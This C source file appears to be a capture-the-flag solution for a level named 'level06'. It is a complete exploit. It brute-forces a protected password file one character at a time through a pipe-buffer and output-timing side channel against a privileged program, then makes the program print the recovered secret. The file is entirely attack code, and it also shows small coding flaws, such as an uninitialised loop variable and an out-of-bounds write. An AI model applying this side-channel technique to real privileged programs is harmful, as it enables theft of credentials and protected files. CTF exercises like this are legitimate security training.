#include <poll.h>
#include <stdio.h>
#include <unistd.h>
#include <string.h>

#define PROG    "/levels/level06"
#define PWDF    "/home/the-flag/.password"
#define TIMEOUT 10
#define BUFSIZE 1024
#define PIPEBUF (1<<16)

char    filling[PIPEBUF];
FILE    *f_err, *f_out;
int     oldout, p_err[2], p_out[2];
struct  pollfd poll_out;

int test_string(int flimit, char* input) {
    // fill buffer until just enough space for dots of string,
    // stalling to see if haha will be printed
    write(p_err[1], filling, flimit);
    pid_t pid;
    if (!(pid = fork())) {
        execl(PROG, PROG, PWDF, input, NULL);
    }

    poll(&poll_out, 1, TIMEOUT);  // wait a bit for possible haha

    while (fgetc(f_err) != '\n'); // flush fill + welcome
    wait(pid);                    // wait for \n (fgetc freed buffer)
    while (fgetc(f_err) != '\n'); // flush dots
    while (fgetc(f_out) != '\n'); // flush haha
    return !(poll_out.revents & POLLIN);
}

int main(int argc, char ** argv) {
    oldout = dup(STDOUT_FILENO);
    pipe(p_out);
    dup2(p_out[1], 1);
    pipe(p_err);
    dup2(p_err[1], 2);
    f_err = fdopen(p_err[0], "r");
    f_out = fdopen(p_out[0], "r");
    poll_out.fd = p_out[0];
    poll_out.events = POLLIN;
    memset(filling, 'a', PIPEBUF);

    char input[BUFSIZE] = {0};
    int size;
    unsigned char c;
    for (size = 0; c < 128; size++) {
        // fill in extra char to make sure we'll fail
        input[size] = -1;
        for (c = 1; c < 128; c++) {
            input[size-1] = c;
            int flimit = PIPEBUF - (33 + size); 
            if (test_string(flimit, input)) {
                break;
            }
        }
    }

    // make it print the pwd to stdout
    input[size-2] = '\0';
    dup2(oldout, 2);
    execl(PROG, PROG, PWDF, input, NULL);
}
